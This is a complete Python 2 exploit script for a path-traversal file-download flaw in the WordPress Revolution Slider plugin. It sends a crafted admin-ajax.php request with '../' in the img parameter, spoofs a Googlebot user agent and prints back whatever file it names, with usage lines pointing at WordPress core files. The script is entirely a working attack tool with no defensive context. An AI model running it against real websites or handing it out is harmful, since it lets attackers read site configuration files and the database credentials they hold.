import urllib2
import sys

if len(sys.argv) < 3:
	print "[-] Usage: <url> <filename or filepath>"
	print "[-] Example: http://website.com wp-settings.php"
	print "[-] Example: http://website.com wp-admin/admin-ajax.php"
	sys.exit(0)
			

url = sys.argv[1]+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../"+sys.argv[2]

headers = {}
headers['User-Agent'] = "Googlebot"

request = urllib2.Request(url,headers=headers)
response = urllib2.urlopen(request)

print response.read()
response.close() 


